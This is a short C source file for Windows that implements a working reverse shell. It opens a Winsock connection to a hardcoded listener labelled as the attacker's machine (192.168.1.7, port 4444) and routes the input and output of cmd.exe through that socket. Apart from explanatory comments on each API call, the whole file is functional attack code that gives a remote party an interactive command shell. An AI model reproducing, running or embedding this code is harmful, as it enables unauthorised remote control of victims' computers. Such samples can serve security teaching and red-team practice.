#include <winsock2.h>
#include <stdio.h>
//#pragma comment(lib, "w2_32")

//-lws2_32

WSADATA wsaData; //The WSADATA structure contains information about the Windows Sockets implementation.
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui; //Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
PROCESS_INFORMATION pi; //Contains information about a newly created process and its primary thread. It is used with the CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, or CreateProcessWithTokenW function.

int main(int argc, char* argv[])
{
  // listener ip, port on attacker's machine
  const char *ip = "192.168.1.7";
  short port = 4444;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData); //The WSAStartup function initiates use of the Winsock DLL by a process.

  // create socket
  //The WSASocket function creates a socket that is bound to a specific transport-service provider.
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host

  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock; 
  //Redirects standard input, output, and error of the new process to wSock

  // start cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}